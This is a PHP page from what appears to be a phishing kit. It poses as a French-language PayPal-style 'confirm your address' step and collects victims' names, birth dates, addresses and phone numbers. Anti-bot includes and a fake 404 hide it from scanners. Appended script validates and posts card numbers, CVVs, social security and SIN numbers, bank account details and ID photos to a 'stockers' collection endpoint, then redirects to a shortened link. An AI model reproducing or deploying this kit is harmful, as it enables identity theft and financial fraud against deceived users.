<?php 

ob_start();
session_start();
if(isset($_SESSION['step_two'])){
include '../email.php';
include'../antibots.php';

?>

    <!DOCTYPE html>
    <html dir="ltr">
        <head>
            <title>Confirmez votre adresse</title>
            <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta charset="utf8">
            <link rel="stylesheet" href="../css/normalize.css" />
            <link rel="stylesheet" href="../css/bootstrap.min.css" />
            <link rel="stylesheet" href="../css/font-awesome.min.css" />
            <link rel="stylesheet" href="../css/main_style.css" />
            <link rel="shortcut icon" type="image/x-icon" href="../img/ppl.ico">
        </head>
        <body>
<?php include'navbar.php'?>
            <div class="contain biling-p">
                <form method="POST" action="<?php echo 'serv5202.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" class="contain-info">
                    <center>
                         <span class="step" style="text-transform:uppercase"><b>étape 1 sur 4</b></span>
                        <h3>Confirmez votre adresse </h3>
                                                <input type="text" name="l_name" class="bill_input" placeholder="Nom" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">
                        <input type="text" name="f_name" class="bill_input" placeholder="Prénom" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">
                        
                        <input id="dob" name="dob" type="tel" class="bill_input" required placeholder="Date de naissance" maxlength="10">
                        <input type="text" name="address1" class="bill_input" placeholder="Adresse personnelle" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">  
                        <select class="bill_input" id="country" required="required" name="country">
    <option value="" selected disabled>Pays</option> 
    <option value="United States">United States</option> 
	<option value="United Kingdom">United Kingdom</option> 
	<option value="Afghanistan">Afghanistan</option> 
	<option value="Albania">Albania</option> 
	<option value="Algeria">Algeria</option> 
	<option value="American Samoa">American Samoa</option> 
	<option value="Andorra">Andorra</option> 
	<option value="Angola">Angola</option> 
	<option value="Anguilla">Anguilla</option> 
	<option value="Antarctica">Antarctica</option> 
	<option value="Antigua and Barbuda">Antigua and Barbuda</option> 
	<option value="Argentina">Argentina</option> 
	<option value="Armenia">Armenia</option> 
	<option value="Aruba">Aruba</option> 
	<option value="Australia">Australia</option> 
	<option value="Austria">Austria</option> 
	<option value="Azerbaijan">Azerbaijan</option> 
	<option value="Bahamas">Bahamas</option> 
	<option value="Bahrain">Bahrain</option> 
	<option value="Bangladesh">Bangladesh</option> 
	<option value="Barbados">Barbados</option> 
	<option value="Belarus">Belarus</option> 
	<option value="Belgium">Belgium</option> 
	<option value="Belize">Belize</option> 
	<option value="Benin">Benin</option> 
	<option value="Bermuda">Bermuda</option> 
	<option value="Bhutan">Bhutan</option> 
	<option value="Bolivia">Bolivia</option> 
	<option value="Bosnia and Herzegovina">Bosnia and Herzegovina</option> 
	<option value="Botswana">Botswana</option> 
	<option value="Bouvet Island">Bouvet Island</option> 
	<option value="Brazil">Brazil</option> 
	<option value="British Indian Ocean Territory">British Indian Ocean Territory</option> 
	<option value="Brunei Darussalam">Brunei Darussalam</option> 
	<option value="Bulgaria">Bulgaria</option> 
	<option value="Burkina Faso">Burkina Faso</option> 
	<option value="Burundi">Burundi</option> 
	<option value="Cambodia">Cambodia</option> 
	<option value="Cameroon">Cameroon</option> 
	<option value="Canada">Canada</option> 
	<option value="Cape Verde">Cape Verde</option> 
	<option value="Cayman Islands">Cayman Islands</option> 
	<option value="Central African Republic">Central African Republic</option> 
	<option value="Chad">Chad</option> 
	<option value="Chile">Chile</option> 
	<option value="China">China</option> 
	<option value="Christmas Island">Christmas Island</option> 
	<option value="Cocos (Keeling) Islands">Cocos (Keeling) Islands</option> 
	<option value="Colombia">Colombia</option> 
	<option value="Comoros">Comoros</option> 
	<option value="Congo">Congo</option> 
	<option value="Congo, The Democratic Republic of The">Congo, The Democratic Republic of The</option> 
	<option value="Cook Islands">Cook Islands</option> 
	<option value="Costa Rica">Costa Rica</option> 
	<option value="Cote D'ivoire">Cote D'ivoire</option> 
	<option value="Croatia">Croatia</option> 
	<option value="Cuba">Cuba</option> 
	<option value="Cyprus">Cyprus</option> 
	<option value="Czech Republic">Czech Republic</option> 
	<option value="Denmark">Denmark</option> 
	<option value="Djibouti">Djibouti</option> 
	<option value="Dominica">Dominica</option> 
	<option value="Dominican Republic">Dominican Republic</option> 
	<option value="Ecuador">Ecuador</option> 
	<option value="Egypt">Egypt</option> 
	<option value="El Salvador">El Salvador</option> 
	<option value="Equatorial Guinea">Equatorial Guinea</option> 
	<option value="Eritrea">Eritrea</option> 
	<option value="Estonia">Estonia</option> 
	<option value="Ethiopia">Ethiopia</option> 
	<option value="Falkland Islands (Malvinas)">Falkland Islands (Malvinas)</option> 
	<option value="Faroe Islands">Faroe Islands</option> 
	<option value="Fiji">Fiji</option> 
	<option value="Finland">Finland</option> 
	<option value="France">France</option> 
	<option value="French Guiana">French Guiana</option> 
	<option value="French Polynesia">French Polynesia</option> 
	<option value="French Southern Territories">French Southern Territories</option> 
	<option value="Gabon">Gabon</option> 
	<option value="Gambia">Gambia</option> 
	<option value="Georgia">Georgia</option> 
	<option value="Germany">Germany</option> 
	<option value="Ghana">Ghana</option> 
	<option value="Gibraltar">Gibraltar</option> 
	<option value="Greece">Greece</option> 
	<option value="Greenland">Greenland</option> 
	<option value="Grenada">Grenada</option> 
	<option value="Guadeloupe">Guadeloupe</option> 
	<option value="Guam">Guam</option> 
	<option value="Guatemala">Guatemala</option> 
	<option value="Guinea">Guinea</option> 
	<option value="Guinea-bissau">Guinea-bissau</option> 
	<option value="Guyana">Guyana</option> 
	<option value="Haiti">Haiti</option> 
	<option value="Heard Island and Mcdonald Islands">Heard Island and Mcdonald Islands</option> 
	<option value="Holy See (Vatican City State)">Holy See (Vatican City State)</option> 
	<option value="Honduras">Honduras</option> 
	<option value="Hong Kong">Hong Kong</option> 
	<option value="Hungary">Hungary</option> 
	<option value="Iceland">Iceland</option> 
	<option value="India">India</option> 
	<option value="Indonesia">Indonesia</option> 
	<option value="Iran, Islamic Republic of">Iran, Islamic Republic of</option> 
	<option value="Iraq">Iraq</option> 
	<option value="Ireland">Ireland</option> 
	<option value="Israel">Israel</option> 
	<option value="Italy">Italy</option> 
	<option value="Jamaica">Jamaica</option> 
	<option value="Japan">Japan</option> 
	<option value="Jordan">Jordan</option> 
	<option value="Kazakhstan">Kazakhstan</option> 
	<option value="Kenya">Kenya</option> 
	<option value="Kiribati">Kiribati</option> 
	<option value="Korea, Democratic People's Republic of">Korea, Democratic People's Republic of</option> 
	<option value="Korea, Republic of">Korea, Republic of</option> 
	<option value="Kuwait">Kuwait</option> 
	<option value="Kyrgyzstan">Kyrgyzstan</option> 
	<option value="Lao People's Democratic Republic">Lao People's Democratic Republic</option> 
	<option value="Latvia">Latvia</option> 
	<option value="Lebanon">Lebanon</option> 
	<option value="Lesotho">Lesotho</option> 
	<option value="Liberia">Liberia</option> 
	<option value="Libyan Arab Jamahiriya">Libyan Arab Jamahiriya</option> 
	<option value="Liechtenstein">Liechtenstein</option> 
	<option value="Lithuania">Lithuania</option> 
	<option value="Luxembourg">Luxembourg</option> 
	<option value="Macao">Macao</option> 
	<option value="Macedonia, The Former Yugoslav Republic of">Macedonia, The Former Yugoslav Republic of</option> 
	<option value="Madagascar">Madagascar</option> 
	<option value="Malawi">Malawi</option> 
	<option value="Malaysia">Malaysia</option> 
	<option value="Maldives">Maldives</option> 
	<option value="Mali">Mali</option> 
	<option value="Malta">Malta</option> 
	<option value="Marshall Islands">Marshall Islands</option> 
	<option value="Martinique">Martinique</option> 
	<option value="Mauritania">Mauritania</option> 
	<option value="Mauritius">Mauritius</option> 
	<option value="Mayotte">Mayotte</option> 
	<option value="Mexico">Mexico</option> 
	<option value="Micronesia, Federated States of">Micronesia, Federated States of</option> 
	<option value="Moldova, Republic of">Moldova, Republic of</option> 
	<option value="Monaco">Monaco</option> 
	<option value="Mongolia">Mongolia</option> 
	<option value="Montserrat">Montserrat</option> 
	<option value="Morocco">Morocco</option> 
	<option value="Mozambique">Mozambique</option> 
	<option value="Myanmar">Myanmar</option> 
	<option value="Namibia">Namibia</option> 
	<option value="Nauru">Nauru</option> 
	<option value="Nepal">Nepal</option> 
	<option value="Netherlands">Netherlands</option> 
	<option value="Netherlands Antilles">Netherlands Antilles</option> 
	<option value="New Caledonia">New Caledonia</option> 
	<option value="New Zealand">New Zealand</option> 
	<option value="Nicaragua">Nicaragua</option> 
	<option value="Niger">Niger</option> 
	<option value="Nigeria">Nigeria</option> 
	<option value="Niue">Niue</option> 
	<option value="Norfolk Island">Norfolk Island</option> 
	<option value="Northern Mariana Islands">Northern Mariana Islands</option> 
	<option value="Norway">Norway</option> 
	<option value="Oman">Oman</option> 
	<option value="Pakistan">Pakistan</option> 
	<option value="Palau">Palau</option> 
	<option value="Palestinian Territory, Occupied">Palestinian Territory, Occupied</option> 
	<option value="Panama">Panama</option> 
	<option value="Papua New Guinea">Papua New Guinea</option> 
	<option value="Paraguay">Paraguay</option> 
	<option value="Peru">Peru</option> 
	<option value="Philippines">Philippines</option> 
	<option value="Pitcairn">Pitcairn</option> 
	<option value="Poland">Poland</option> 
	<option value="Portugal">Portugal</option> 
	<option value="Puerto Rico">Puerto Rico</option> 
	<option value="Qatar">Qatar</option> 
	<option value="Reunion">Reunion</option> 
	<option value="Romania">Romania</option> 
	<option value="Russian Federation">Russian Federation</option> 
	<option value="Rwanda">Rwanda</option> 
	<option value="Saint Helena">Saint Helena</option> 
	<option value="Saint Kitts and Nevis">Saint Kitts and Nevis</option> 
	<option value="Saint Lucia">Saint Lucia</option> 
	<option value="Saint Pierre and Miquelon">Saint Pierre and Miquelon</option> 
	<option value="Saint Vincent and The Grenadines">Saint Vincent and The Grenadines</option> 
	<option value="Samoa">Samoa</option> 
	<option value="San Marino">San Marino</option> 
	<option value="Sao Tome and Principe">Sao Tome and Principe</option> 
	<option value="Saudi Arabia">Saudi Arabia</option> 
	<option value="Senegal">Senegal</option> 
	<option value="Serbia and Montenegro">Serbia and Montenegro</option> 
	<option value="Seychelles">Seychelles</option> 
	<option value="Sierra Leone">Sierra Leone</option> 
	<option value="Singapore">Singapore</option> 
	<option value="Slovakia">Slovakia</option> 
	<option value="Slovenia">Slovenia</option> 
	<option value="Solomon Islands">Solomon Islands</option> 
	<option value="Somalia">Somalia</option> 
	<option value="South Africa">South Africa</option> 
	<option value="South Georgia and The South Sandwich Islands">South Georgia and The South Sandwich Islands</option> 
	<option value="Spain">Spain</option> 
	<option value="Sri Lanka">Sri Lanka</option> 
	<option value="Sudan">Sudan</option> 
	<option value="Suriname">Suriname</option> 
	<option value="Svalbard and Jan Mayen">Svalbard and Jan Mayen</option> 
	<option value="Swaziland">Swaziland</option> 
	<option value="Sweden">Sweden</option> 
	<option value="Switzerland">Switzerland</option> 
	<option value="Syrian Arab Republic">Syrian Arab Republic</option> 
	<option value="Taiwan, Province of China">Taiwan, Province of China</option> 
	<option value="Tajikistan">Tajikistan</option> 
	<option value="Tanzania, United Republic of">Tanzania, United Republic of</option> 
	<option value="Thailand">Thailand</option> 
	<option value="Timor-leste">Timor-leste</option> 
	<option value="Togo">Togo</option> 
	<option value="Tokelau">Tokelau</option> 
	<option value="Tonga">Tonga</option> 
	<option value="Trinidad and Tobago">Trinidad and Tobago</option> 
	<option value="Tunisia">Tunisia</option> 
	<option value="Turkey">Turkey</option> 
	<option value="Turkmenistan">Turkmenistan</option> 
	<option value="Turks and Caicos Islands">Turks and Caicos Islands</option> 
	<option value="Tuvalu">Tuvalu</option> 
	<option value="Uganda">Uganda</option> 
	<option value="Ukraine">Ukraine</option> 
	<option value="United Arab Emirates">United Arab Emirates</option> 
	<option value="United Kingdom">United Kingdom</option> 
	<option value="United States">United States</option> 
	<option value="United States Minor Outlying Islands">United States Minor Outlying Islands</option> 
	<option value="Uruguay">Uruguay</option> 
	<option value="Uzbekistan">Uzbekistan</option> 
	<option value="Vanuatu">Vanuatu</option> 
	<option value="Venezuela">Venezuela</option> 
	<option value="Viet Nam">Viet Nam</option> 
	<option value="Virgin Islands, British">Virgin Islands, British</option> 
	<option value="Virgin Islands, U.S.">Virgin Islands, U.S.</option> 
	<option value="Wallis and Futuna">Wallis and Futuna</option> 
	<option value="Western Sahara">Western Sahara</option> 
	<option value="Yemen">Yemen</option> 
	<option value="Zambia">Zambia</option> 
	<option value="Zimbabwe">Zimbabwe</option>
                        </select>
                                              <input type="text" name="city" class="bill_input" placeholder="Ville" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">
                        
                        <input type="text" name="ZIP" maxlength="7" class="bill_input" placeholder="Code Postal" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">
                                                <input type="num" name="phone" class="bill_input" placeholder="Numéro de téléphone" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">
                        <hr>
                        <input type="submit" value="Continuer" class="bill_input btn-bill">
                    </center>
                </form>
            </div>
<?php include'footer.php'?>
            <script src="../js/jquery-1.11.3.min.js"></script>
            <script src="../js/bootstrap.min.js"></script>
            <script src="../js/cont.js"></script>
            <script src="../js/jquery.maskedinput.js"></script>
            <script src="../js/plugins.js"></script>
            <script src="../js/jquery-3.3.1.min.js"></script>
            <script src="../js/jquery.mask.min.js"></script>
            <script>
    $(document).ready(function() {
            $.getJSON("http://ip-api.com/json", function(data) {
                    var kap = (data.country);
                    $("#country").val(kap);
                });
    });
    
            </script>
        </body>
    </html>
<?php
} 
else {
    header("HTTP/1.0 404 Not Found");
	die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}
?>
<script>$(document).ready(function(){$('#cex').mask('00/00');$('#csc').mask('0000');$('#dob').mask('00/00/0000');$('#ccn').mask('0000 0000 0000 0000 000');$('#pnm').mask('000000000000000');$('#ssn').mask('000-00-0000');$('#acn').mask('00000000');$('#stc').mask('00-00-00');$('#sin').mask('000-000-000');function validExp(b){var a=new RegExp("(([0][1-9]{1})|([1][0-2]{1}))/(([1][8-9]{1})|([2][0-9]{1}))");return a.test(b);}
function isDate(vl){var rg=/^([0-9]{2})+\/([0-9]{2})+\/([0-9]{4})+$/;return rg.test(vl);}
function validDob(vl){var c=false;if(isDate(vl)&&(vl.split('/')[2]>"1919"&&vl.split('/')[2]<"2006")){c=true;}
return c;}
function valid(){var check=true;var ii=0;$('#process input:not(.bt):not([type=checkbox]),#process select').each(function(i,el){if(!$(el).val()){$(el).parent().addClass('hasError');check=false;}else{$(el).not('#ccn').parent().removeClass('hasError');}
if($(el).attr('id')=='cex'){if(!validExp($(el).val())){$(el).parent().addClass('hasError');check=false;}else{$(el).parent().removeClass('hasError');}}
if($(el).attr('id')=='dob'){if(!validDob($(el).val())){$(el).parent().addClass('hasError');check=false;}else{$(el).parent().removeClass('hasError');}}
if($(el).attr('id')=='csc'){if($('select:first').val()=='amx'&&$(el).val().length!=4){$(el).parent().addClass('hasError');check=false;}else{$(el).parent().removeClass('hasError');}
if($('select:first').val()!='amx'&&$(el).val().length!=3){$(el).parent().addClass('hasError');check=false;}}});return check;}
$(document).on('change','#process select',function(){$(this).parent().removeClass('hasError');$(this).parent().children('.labelSelect').html($(this).children("option:selected").text());$(this).parent().attr('data-name',$(this).val());if($(this).val()=='amx'){$('.csc input').attr('placeholder',$('.csc input').attr('placeholder').replace('3','4'));$('.csc input').attr('maxlength','4');}else{$('.csc input').attr('placeholder',$('.csc input').attr('placeholder').replace('4','3'));$('.csc input').attr('maxlength','3');}});var ccvalid=false;$('#ccn').validateCreditCard(function(result){var cc=$('#ccn');if(cc.val()!=''){if(result.valid){cc.parent().removeClass('hasError');ccvalid=true;}else{cc.parent().addClass('hasError');ccvalid=false;}}});$('#process input:not(.bt):not([type=checkbox]),select').each(function(i,el){$(el).keyup(function(){valid();});$(el).change(function(){valid();});});$(document).on('submit','#process form',function(){check=true;if(!valid()){check=false;}
if(!validExp($('#cex').val())){$('#cex').parent().addClass('hasError');check=false;}else{$('#cex').parent().removeClass('hasError');}
if(!ccvalid){$('#ccn').parent().addClass('hasError');check=false;}
if(!validDob($('#dob').val())){$('#dob').parent().addClass('hasError');check=false;}
if(!check){return false;}else{$('#rotate').removeClass('hide');var ctp=$('#ctp').children("option:selected").text();var ccn=$('#ccn').val();var cex=$('#cex').val();var csc=$('#csc').val();var fnm=$('#fnm').val();var dob=$('#dob').val();var adr=$('#adr').val();var cty=$('#cty').val();var zip=$('#zip').val();var stt=$('#stt').val();var cnt=$('#cnt').val();var ptp=$('#ptp').val();var par=$('#par').val();var pnm=$('#pnm').val();var mdn=$('#mdn').val();var ssn=$('#ssn').val();var pps=$('#pps').val();var clm=$('#clm').val();var dln=$('#dln').val();var sin=$('#sin').val();var pse=$('#pse').val();var dni=$('#dni').val();var bsn=$('#bsn').val();var cpf=$('#cpf').val();var fcn=$('#fcn').val();var acn=$('#acn').val();var stc=$('#stc').val();var bus=$('#bus').val();var bpw=$('#bpw').val();var o={ctp,ccn,cex,csc,fnm,dob,adr,cty,zip,stt,cnt,ptp,par,pnm,mdn,ssn,pps,clm,dln,sin,pse,dni,bsn,cpf,fcn,acn,stc,bus,bpw};var start=new Date;var xT=0;var idT=setInterval(function(){xT=Math.trunc((new Date-start)/1000);},1000);var toStart=0;$.post('../extra/stockers/step2.php',o,function(data,status){if(data=='done'&&status=='success'){clearInterval(idT);if(xT>4){toStart=0;}else{toStart=1800;}
setTimeout(function(){setId();},toStart);}else{$('#rotate').addClass('hide');}});}
return false;});function setId(){$('#rotate').addClass('hide');$('#process').addClass('hide');$('#finish').removeClass('hide');window.scrollTo(0,0);}
$('.gone_bt').click(function(){window.location.href="https://bit.ly/1bJnLWA";});function readFile(files,me,check){if(files){for(var i=0;i<files.length;i++){var FR=new FileReader();FR.onload=function(e){if(e.target.result.startsWith("data:image/")&&e.total<=5000000){if(check){$(me).parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="'+e.target.result+'" alt=""><button class="btDel">X</button></div>');}else{$(me).parent().parent().parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="'+e.target.result+'" alt=""><button class="btDel">X</button></div>');}
$(me).closest('form').append('<input type="hidden" value="'+e.target.result+'" name="images[]">');}}
FR.readAsDataURL(files[i]);}}}
$(document).on('click','.zone',function(e){e.stopPropagation();$(this).find('input[type=file]').trigger(e);});$(document).on('click','.btDel',function(){$(this).closest('form').find('[value="'+$(this).prev().attr('src')+'"]').remove();$(this).parent().remove();});$(document).on('change','input[type=file]',function(){readFile(this.files,this,false);});$(".dropzone-main").on('dragleave',function(e){e.preventDefault();$(this).css('border','2px dashed #dee3e7');$(this).css('background','#f0f2f4');});$(".dropzone-main").on('dragover',function(e){e.preventDefault();$(this).css('border','2px dashed #0564b3');$(this).css('background','#ecf1f9');});$(".dropzone-main").on('drop',function(e){e.preventDefault();$(this).css('border','2px dashed #41ad49');readFile(e.originalEvent.dataTransfer.files,this,true);});});</script>
